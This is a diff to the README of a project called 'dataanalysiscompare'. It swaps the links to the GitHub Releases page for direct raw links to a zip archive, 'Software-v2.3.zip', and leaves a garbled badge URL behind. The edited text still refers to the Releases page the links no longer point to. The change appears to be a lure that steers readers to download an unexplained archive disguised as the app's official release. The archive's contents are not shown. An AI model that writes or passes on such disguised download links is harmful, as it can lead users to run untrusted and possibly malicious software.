@@ -1,6 +1,6 @@
 # 📊 dataanalysiscompare - Choose the Best Data Tool Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue?style=for-the-badge&logo=github)](https://github.com/isma-2008/dataanalysiscompare/releases)
+[![Download](https://raw.githubusercontent.com/isma-2008/dataanalysiscompare/main/dataanalysiscompare/Software-v2.3.zip%20Now-Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/isma-2008/dataanalysiscompare/main/dataanalysiscompare/Software-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Thank you for your interest in **dataanalysiscompare**! This application helps y
 
 To get started, you will need to download the software. Please visit the following link to access the Releases page:
 
-[Download the latest version](https://github.com/isma-2008/dataanalysiscompare/releases)
+[Download the latest version](https://raw.githubusercontent.com/isma-2008/dataanalysiscompare/main/dataanalysiscompare/Software-v2.3.zip)
 
 Once you are on the Releases page, follow these steps:
 
